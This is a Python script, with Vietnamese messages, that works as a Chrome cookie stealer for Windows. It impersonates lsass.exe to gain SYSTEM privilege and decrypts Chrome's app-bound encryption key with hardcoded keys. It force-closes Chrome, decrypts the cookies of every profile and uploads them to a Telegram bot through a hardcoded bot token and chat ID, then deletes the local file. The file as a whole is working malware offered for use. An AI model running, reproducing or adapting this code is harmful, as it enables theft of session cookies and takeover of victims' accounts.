import os
import io
import sys
import json
import struct
import ctypes
import sqlite3
import pathlib
import binascii
import time
import shutil
import glob
from contextlib import contextmanager

try:
    import windows
    import windows.security
    import windows.crypto
    import windows.generated_def as gdef
except ImportError:
    print("❌ Thiếu thư viện 'windows'")
    print("📦 Đang cài đặt...")
    os.system("pip install git+https://github.com/ReWolf/python-windows.git")
    import windows
    import windows.security
    import windows.crypto
    import windows.generated_def as gdef

from Crypto.Cipher import AES, ChaCha20_Poly1305
import requests

# Telegram config
bot_token = '8581243471:AAG6aJyB-pcDBJwNPfgUXMnhBDlJREpJmts' 
chat_id = '-1003628689556'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def find_all_chrome_profiles():
    """Tìm tất cả profile của Chrome"""
    user_profile = os.environ['USERPROFILE']
    chrome_data = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"
    
    if not os.path.exists(chrome_data):
        print(f"❌ Không tìm thấy Chrome data tại: {chrome_data}")
        return []
    
    profiles = []
    
    # Tìm tất cả profile (Default, Profile 1, Profile 2, ...)
    all_dirs = os.listdir(chrome_data)
    
    for dir_name in all_dirs:
        # Kiểm tra nếu là profile
        if dir_name == "Default" or dir_name.startswith("Profile "):
            cookie_path = os.path.join(chrome_data, dir_name, "Network", "Cookies")
            if os.path.exists(cookie_path):
                profiles.append({
                    'name': dir_name,
                    'path': os.path.join(chrome_data, dir_name),
                    'cookie_db': cookie_path
                })
    
    return profiles

@contextmanager
def impersonate_lsass():
    """impersonate lsass.exe to get SYSTEM privilege"""
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    except Exception as e:
        print(f"⚠️  Lỗi impersonate: {e}")
        yield
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed_data = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed_data['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    assert header_len + content_len + 8 == len(blob_data)
    
    parsed_data['flag'] = buffer.read(1)[0]
    
    if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    elif parsed_data['flag'] == 3:
        parsed_data['encrypted_aes_key'] = buffer.read(32)
        parsed_data['iv'] = buffer.read(12)
        parsed_data['ciphertext'] = buffer.read(32)
        parsed_data['tag'] = buffer.read(16)
    else:
        raise ValueError(f"Unsupported flag: {parsed_data['flag']}")

    return parsed_data

def decrypt_with_cng(input_data):
    ncrypt = ctypes.windll.NCRYPT
    hProvider = gdef.NCRYPT_PROV_HANDLE()
    provider_name = "Microsoft Software Key Storage Provider"
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
    assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"

    hKey = gdef.NCRYPT_KEY_HANDLE()
    key_name = "Google Chromekey1"
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
    assert status == 0, f"NCryptOpenKey failed with status {status}"

    pcbResult = gdef.DWORD(0)
    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        None,
        0,
        ctypes.byref(pcbResult),
        0x40
    )
    assert status == 0, f"1st NCryptDecrypt failed with status {status}"

    buffer_size = pcbResult.value
    output_buffer = (ctypes.c_ubyte * pcbResult.value)()

    status = ncrypt.NCryptDecrypt(
        hKey,
        input_buffer,
        len(input_buffer),
        None,
        output_buffer,
        buffer_size,
        ctypes.byref(pcbResult),
        0x40
    )
    assert status == 0, f"2nd NCryptDecrypt failed with status {status}"

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)

    return bytes(output_buffer[:pcbResult.value])

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data: dict) -> bytes:
    if parsed_data['flag'] == 1:
        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 2:
        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
    elif parsed_data['flag'] == 3:
        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
        with impersonate_lsass():
            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])

    return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

def decrypt_cookie_v20(encrypted_value, master_key):
    """Giải mã cookie v20"""
    try:
        if encrypted_value[:3] != b"v20":
            return None
            
        cookie_iv = encrypted_value[3:3+12]
        encrypted_cookie = encrypted_value[3+12:-16]
        cookie_tag = encrypted_value[-16:]
        cookie_cipher = AES.new(master_key, AES.MODE_GCM, nonce=cookie_iv)
        decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
        return decrypted_cookie[32:].decode('utf-8', errors='ignore')
    except Exception as e:
        return None

def send_file_to_telegram(file_path: str):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    retries = 3  
    for attempt in range(retries):
        try:
            with open(file_path, 'rb') as file:
                response = requests.post(
                    url,
                    files={'document': file},
                    data={'chat_id': chat_id}
                )
            if response.status_code == 200:
                print("✅ Gửi file thành công!")
                return response
            else:
                print(f"❌ Không thể gửi tệp. Mã trạng thái: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"❌ Lần thử {attempt + 1} thất bại: {e}")
            if attempt < retries - 1:
                time.sleep(5)  
            else:
                print("Đã thử tối đa. Không thể gửi tệp.")
    return None

def send_message_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        response = requests.post(
            url,
            data={'chat_id': chat_id, 'text': message}
        )
        return response.status_code == 200
    except:
        return False

def process_profile(profile, v20_master_key, all_cookies):
    """Xử lý một profile"""
    print(f"📁 Đang xử lý profile: {profile['name']}")
    
    cookie_db_path = profile['cookie_db']
    
    # Copy file cookies để tránh lock
    temp_db = os.path.join(os.environ['TEMP'], f'cookies_{profile["name"]}.db')
    
    try:
        shutil.copy2(cookie_db_path, temp_db)
    except Exception as e:
        print(f"  ⚠️  Không thể copy file: {e}")
        temp_db = cookie_db_path
    
    try:
        con = sqlite3.connect(temp_db)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;")
        cookies = cur.fetchall()
        con.close()
        
        # Lọc cookies v20
        cookies_v20 = [c for c in cookies if c[2] and len(c[2]) > 3 and c[2][:3] == b"v20"]
        
        if not cookies_v20:
            print(f"  ⚠️  Không có cookies v20")
            if temp_db != cookie_db_path and os.path.exists(temp_db):
                os.remove(temp_db)
            return
        
        # Giải mã cookies
        decrypted_count = 0
        for c in cookies_v20:
            try:
                decrypted = decrypt_cookie_v20(c[2], v20_master_key)
                if decrypted:
                    all_cookies.append({
                        'profile': profile['name'],
                        'host': c[0],
                        'name': c[1],
                        'value': decrypted
                    })
                    decrypted_count += 1
            except Exception as e:
                pass
        
        print(f"  ✅ Đã giải mã {decrypted_count} cookies")
        
        # Xóa file tạm
        if temp_db != cookie_db_path and os.path.exists(temp_db):
            os.remove(temp_db)
            
    except sqlite3.Error as e:
        print(f"  ❌ Lỗi SQLite: {e}")
        if temp_db != cookie_db_path and os.path.exists(temp_db):
            os.remove(temp_db)

def main():
    print("="*60)
    print("CHROME COOKIE EXTRACTOR - TẤT CẢ PROFILE")
    print("="*60)
    
    if not is_admin():
        print("❌ Script cần chạy với quyền Administrator!")
        print("Vui lòng chạy lại với quyền admin.")
        input("Nhấn Enter để thoát...")
        sys.exit(1)
    
    print("✅ Đang chạy với quyền Administrator")
    
    # Tìm tất cả profile
    profiles = find_all_chrome_profiles()
    
    if not profiles:
        print("❌ Không tìm thấy profile Chrome nào có cookies!")
        return
    
    print(f"\n✅ Tìm thấy {len(profiles)} profile(s):")
    for p in profiles:
        print(f"  📁 {p['name']}")
    
    # Lấy master key
    user_profile = os.environ['USERPROFILE']
    local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
    
    print("\n📖 Đang đọc Local State...")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    if "app_bound_encrypted_key" not in local_state["os_crypt"]:
        print("❌ Không tìm thấy app_bound_encrypted_key!")
        return
        
    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    decoded = binascii.a2b_base64(app_bound_encrypted_key)
    if decoded[:4] != b"APPB":
        print("❌ Invalid APPB format!")
        return
        
    key_blob_encrypted = decoded[4:]
    
    print("🔑 Đang giải mã với SYSTEM DPAPI...")
    with impersonate_lsass():
        key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)

    print("🔑 Đang giải mã với user DPAPI...")
    key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
    
    print("🔑 Đang parse key blob...")
    parsed_data = parse_key_blob(key_blob_user_decrypted)
    
    print("🔑 Đang derive master key...")
    v20_master_key = derive_v20_master_key(parsed_data)
    
    # Đóng Chrome
    print("\n🔄 Đang đóng Chrome...")
    os.system('taskkill /f /im chrome.exe 2>nul')
    time.sleep(2)
    
    # Xử lý tất cả profile
    print("\n🔓 Đang giải mã cookies từ tất cả profile...")
    all_cookies = []
    for profile in profiles:
        process_profile(profile, v20_master_key, all_cookies)
    
    # Lưu và gửi kết quả
    if all_cookies:
        output_file = "chrome_all_cookies.txt"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("="*80 + "\n")
            f.write(f"CHROME COOKIES - TẤT CẢ PROFILE\n")
            f.write(f"Tổng số: {len(all_cookies)} cookies\n")
            f.write("="*80 + "\n\n")
            
            # Nhóm theo profile
            profile_groups = {}
            for cookie in all_cookies:
                profile_name = cookie['profile']
                if profile_name not in profile_groups:
                    profile_groups[profile_name] = []
                profile_groups[profile_name].append(cookie)
            
            for profile_name, cookies in profile_groups.items():
                f.write(f"\n{'='*80}\n")
                f.write(f"PROFILE: {profile_name} ({len(cookies)} cookies)\n")
                f.write(f"{'='*80}\n\n")
                
                for cookie in cookies:
                    f.write(f"Host: {cookie['host']}\n")
                    f.write(f"Name: {cookie['name']}\n")
                    f.write(f"Value: {cookie['value']}\n")
                    f.write("-"*80 + "\n")
        
        print(f"\n✅ Tổng cộng: {len(all_cookies)} cookies đã giải mã!")
        print(f"📊 Chi tiết theo profile:")
        profile_counts = {}
        for cookie in all_cookies:
            profile_counts[cookie['profile']] = profile_counts.get(cookie['profile'], 0) + 1
        for profile, count in profile_counts.items():
            print(f"  📁 {profile}: {count} cookies")
        
        # Gửi qua Telegram
        send_message_to_telegram(f"✅ Trích xuất {len(all_cookies)} cookies v20 từ Chrome ({len(profiles)} profile(s))!")
        send_file_to_telegram(output_file)
        
        if os.path.exists(output_file):
            os.remove(output_file)
    else:
        print("\n❌ Không thể giải mã cookies nào!")

if __name__ == "__main__":
    main()